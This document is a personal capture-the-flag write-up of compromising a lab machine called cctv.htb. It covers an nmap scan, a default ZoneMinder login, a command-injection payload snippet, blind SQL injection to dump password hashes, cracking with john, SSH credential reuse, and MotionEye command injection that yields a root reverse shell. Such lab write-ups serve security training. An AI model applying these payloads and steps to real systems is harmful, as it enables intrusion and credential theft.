
ME: 10.10.14.139
TARGET: 10.129.244.156
# NMAP

```
└─$ sudo nmap -sC -sV -p- -Pn 10.129.244.156 --max-retries 1
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-24 02:02 -0400
Warning: 10.129.244.156 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.129.244.156
Host is up (0.029s latency).
Not shown: 65396 closed tcp ports (reset), 137 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_  256 e3:9b:38:08:9a:d7:e9:d1:94:11:ff:50:80:bc:f2:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.56 seconds
```

Added cctv.htb to my hosts file to have name resolution work

# Port 80

cctv.htb has some text about being a 24/7 monitoring service
Also has ZoneMinder running which opened to admin admin as default credentials.

The version is zoneminder v1.37.63  which seems to be vulnerable to CVE-2023-26035. Found PoC code [here](https://gist.github.com/Splinter0/04d1128110c9cbe6f03b3c88d93dcd8c)

Uses regex to find the CSRF token on the main page followed by using it to send a request to create a snapshot with a command injection payload:

```
data={
            "view": "snapshot",
            "action": "create",
            "monitor_ids[0][Id]": f";{cmd}",
            "__csrf_magic": csrfToken
        }
```

This exploit did not work and seemed to be a dead end

Found CVE-2024-51482 which I could validate by editing and sending requests with a SLEEP() payload in firefox directly. Also, poking around in the zoneminder app showed users mark and superadmin exist so maybe passwords for either of those 2 would be non-default and could maybe be used for password reuse against the SSH service. This vulnerability has a full PoC to use the time-based blind SQLi to dump the users table [here](https://github.com/BridgerAlderson/CVE-2024-51482/blob/main/CVE-2024-51482.py) so I just ran that and it started enumerating the users table followed by dumping it.

The hash for mark was crackable by using the rockyou wordlist:

```
┌──(xmen㉿kali)-[~]
└─$ echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.txt
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~]
└─$ john mark.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
opensesame       (?)     
1g 0:00:00:31 DONE (2026-06-24 03:14) 0.03187g/s 190.5p/s 190.5c/s 190.5C/s march23..tuyyo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

This clearly hints at being the foothold and it was the credential for SSH for the mark user on the box.

# SSH as mark

Logged in via ssh mark@cctv.htb

```
mark@cctv:~$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
```

Used python simple server to serve up linpeas and ran it

Seems that there are some internally accessible ports open:

```
mark@cctv:~$ netstat -ano | grep tcp
tcp        0      0 127.0.0.1:1935          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:7999          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:9081          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8554          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0     88 10.129.244.156:22       10.10.14.139:44200      ESTABLISHED on (0.08/0/0)
```

And a few services that are running as  root:

```
                                                                                                                                                                                                                                            
══╣ Active services:
apache2.service                          loaded active running The Apache HTTP Server                                                                                                                                                       
apparmor.service                         loaded active exited  Load AppArmor profiles
apport.service                           loaded active exited  automatic crash report generation
auditd.service                           loaded active running Security Auditing Service
blk-availability.service                 loaded active exited  Availability of block devices
console-setup.service                    loaded active exited  Set console font and keymap
containerd.service                       loaded active running containerd container runtime
cron.service                             loaded active running Regular background program processing daemon
dbus.service                             loaded active running D-Bus System Message Bus
  Potential issue in service file: /usr/lib/systemd/system/dbus.service
  └─ RELATIVE_PATH: Could be executing some relative path
docker.service                           loaded active running Docker Application Container Engine
fail2ban.service                         loaded active running Fail2Ban Service
finalrd.service                          loaded active exited  Create final runtime dir for shutdown pivot root
fwupd.service                            loaded active running Firmware update daemon
getty@tty1.service                       loaded active running Getty on tty1
ifup@eth0.service                        loaded active exited  ifup for eth0
  Potential issue in service file: /usr/lib/systemd/system/ifup@.service
  └─ RELATIVE_PATH: Could be executing some relative path
ifupdown-pre.service                     loaded active exited  Helper to synchronize boot up for ifupdown
  Potential issue in service file: /usr/lib/systemd/system/ifupdown-pre.service
  └─ RELATIVE_PATH: Could be executing some relative path
keyboard-setup.service                   loaded active exited  Set the console keyboard layout
kmod-static-nodes.service                loaded active exited  Create List of Static Device Nodes
lvm2-monitor.service                     loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
ModemManager.service                     loaded active running Modem Manager
  Potential issue in service: ModemManager.service
  └─ RUNS_AS_ROOT: Service runs as root
motioneye.service                        loaded active running motionEye Server
  Potential issue in service: motioneye.service
  └─ RUNS_AS_ROOT: Service runs as root
mysql.service                            loaded active running MySQL Community Server
networkd-dispatcher.service              loaded active running Dispatcher daemon for systemd-networkd
networking.service                       loaded active exited  Raise network interfaces
  Potential issue in service file: /usr/lib/systemd/system/networking.service
  └─ RELATIVE_PATH: Could be executing some relative path
open-vm-tools.service                    loaded active running Service for virtual machines hosted on VMware
plymouth-quit-wait.service               loaded active exited  Hold until boot process finishes up
plymouth-quit.service                    loaded active exited  Terminate Plymouth Boot Screen
plymouth-read-write.service              loaded active exited  Tell Plymouth To Write Out Runtime Data
polkit.service                           loaded active running Authorization Manager
rsyslog.service                          loaded active running System Logging Service
setvtrgb.service                         loaded active exited  Set console scheme
snapd.apparmor.service                   loaded active exited  Load AppArmor profiles managed internally by snapd
snapd.seeded.service                     loaded active exited  Wait until snapd is fully seeded
snapd.service                            loaded active running Snap Daemon
ssh.service                              loaded active running OpenBSD Secure Shell server
sshguard.service                         loaded active running SSHGuard
sysstat.service                          loaded active exited  Resets System Activity Logs
  Potential issue in service: sysstat.service
  └─ RUNS_AS_ROOT: Service runs as root
systemd-binfmt.service                   loaded active exited  Set Up Additional Binary Formats
systemd-journal-flush.service            loaded active exited  Flush Journal to Persistent Storage
  Potential issue in service file: /usr/lib/systemd/system/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path
systemd-journald.service                 loaded active running Journal Service
systemd-logind.service                   loaded active running User Login Management
systemd-modules-load.service             loaded active exited  Load Kernel Modules
systemd-random-seed.service              loaded active exited  Load/Save OS Random Seed
systemd-remount-fs.service               loaded active exited  Remount Root and Kernel File Systems
  Potential issue in service: systemd-remount-fs.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-resolved.service                 loaded active running Network Name Resolution
systemd-sysctl.service                   loaded active exited  Apply Kernel Variables
systemd-timesyncd.service                loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev-early.service loaded active exited  Create Static Device Nodes in /dev gracefully
systemd-tmpfiles-setup-dev.service       loaded active exited  Create Static Device Nodes in /dev
systemd-tmpfiles-setup.service           loaded active exited  Create Volatile Files and Directories
systemd-udev-trigger.service             loaded active exited  Coldplug All udev Devices
  Potential issue in service file: /usr/lib/systemd/system/systemd-udev-trigger.service
  └─ RELATIVE_PATH: Could be executing some relative path
  Potential issue in service: systemd-udev-trigger.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands
systemd-udevd.service                    loaded active running Rule-based Manager for Device Events and Files
systemd-update-utmp.service              loaded active exited  Record System Boot/Shutdown in UTMP
systemd-user-sessions.service            loaded active exited  Permit User Sessions
udisks2.service                          loaded active running Disk Manager
upower.service                           loaded active running Daemon for power management
user-runtime-dir@1000.service            loaded active exited  User Runtime Directory /run/user/1000
user@1000.service                        loaded active running User Manager for UID 1000
vgauth.service                           loaded active running Authentication service for virtual machines hosted on VMware
zoneminder.service                       loaded active running ZoneMinder CCTV recording and surveillance system
Legend: LOAD   → Reflects whether the unit definition was properly loaded.
ACTIVE → The high-level unit activation state, i.e. generalization of SUB.
SUB    → The low-level unit activation state, values depend on unit type.
60 loaded units listed.
```

Used [[port-forwarding-with-ssh|ssh to port forward ]]8888 and 8765 so I can poke at them because they were the only ones exposing some kind of web apps:

```
mark@cctv:~$ curl -I 127.0.0.1:33060
curl: (1) Received HTTP/0.9 when not allowed
mark@cctv:~$ curl -I 127.0.0.1:8888
HTTP/1.1 404 Not Found
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Content-Type: text/plain
Server: mediamtx
Date: Wed, 24 Jun 2026 00:41:01 GMT
Content-Length: 18

mark@cctv:~$ curl -I 127.0.0.1:8765
HTTP/1.1 200 OK
Server: motionEye/0.43.1b4
Content-Type: text/html; charset=UTF-8
Date: Wed, 24 Jun 2026 00:41:08 GMT
Etag: "da39a3ee5e6b4b0d3255bfef95601890afd80709"
Content-Length: 0

mark@cctv:~$ curl -I 127.0.0.1:9081
curl: (52) Empty reply from server
mark@cctv:~$ curl -I 127.0.0.1:8554
```


# Port 8888

This port gave a 404 but seems to have a streaming service running with no easily seen streams

# Port 8765

This is Motioneye which is the service running as root as seen by linpeas. Also seems to have the /etc/Motioneye folder accessible by my user mark.

This folder has 3 files and one of them had a password in it:

```
mark@cctv:~$ cat /etc/motioneye/motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

This password for the admin user let me into the MotionEye UI. Found a write up on another command injection vulnerability (only protected against by clientside JS) here

Exploiting is possible as I was able to run a touch command as root by taking a snapshot which tries to save to the file, executing the command in the process:

```
mark@cctv:~$ ls /tmp
MotionEye                                                                     systemd-private-629f3d455a3a4831ad96f4f4867e7944-polkit.service-ZgQ9ML             tmux-1000
snap-private-tmp                                                              systemd-private-629f3d455a3a4831ad96f4f4867e7944-systemd-logind.service-GY7ozM     vmware-root_682-2697467275
systemd-private-629f3d455a3a4831ad96f4f4867e7944-apache2.service-fBc0dX       systemd-private-629f3d455a3a4831ad96f4f4867e7944-systemd-resolved.service-M9wH0e   zm
systemd-private-629f3d455a3a4831ad96f4f4867e7944-fwupd.service-OKa7yk         systemd-private-629f3d455a3a4831ad96f4f4867e7944-systemd-timesyncd.service-uAZQRt
systemd-private-629f3d455a3a4831ad96f4f4867e7944-ModemManager.service-mtYq2R  systemd-private-629f3d455a3a4831ad96f4f4867e7944-upower.service-LH9fO5
mark@cctv:~$ ls /tmp
iwashere                                                                 systemd-private-629f3d455a3a4831ad96f4f4867e7944-ModemManager.service-mtYq2R       systemd-private-629f3d455a3a4831ad96f4f4867e7944-upower.service-LH9fO5
MotionEye                                                                systemd-private-629f3d455a3a4831ad96f4f4867e7944-polkit.service-ZgQ9ML             tmux-1000
snap-private-tmp                                                         systemd-private-629f3d455a3a4831ad96f4f4867e7944-systemd-logind.service-GY7ozM     vmware-root_682-2697467275
systemd-private-629f3d455a3a4831ad96f4f4867e7944-apache2.service-fBc0dX  systemd-private-629f3d455a3a4831ad96f4f4867e7944-systemd-resolved.service-M9wH0e   zm
systemd-private-629f3d455a3a4831ad96f4f4867e7944-fwupd.service-OKa7yk    systemd-private-629f3d455a3a4831ad96f4f4867e7944-systemd-timesyncd.service-uAZQRt
```

Used revshells to generate a reverse shell and injected that command instead. This gave a reverse shell as root.

```
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.139] from (UNKNOWN) [10.129.244.156] 42004
root@cctv:/etc/motioneye# whoami
whoami
root
```

==DONE==
